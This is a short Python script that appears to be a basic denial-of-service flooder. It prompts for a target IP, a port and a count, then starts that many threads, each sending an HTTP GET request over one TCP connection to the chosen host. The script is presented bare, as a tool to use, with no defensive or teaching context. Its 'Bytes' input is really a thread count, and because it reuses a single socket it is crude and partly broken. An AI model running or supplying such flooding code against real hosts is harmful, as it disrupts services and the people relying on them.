import threading
import socket

ip = socket.gethostbyname(input("IP: "))
port = int(input("Port: "))
byte_s = int(input("Bytes: "))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))


def tcp():
    try:
        request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode()
        sock.sendall(request)

        print("\033[32m[+]\033[0m TCP Packet sent!")

    except Exception as err:
        print("\033[31m[-]\033[0m Connection down")


for i in range(byte_s):
    thread = threading.Thread(target=tcp)
    thread.start()

input("\nPress any key to continue . . . ")
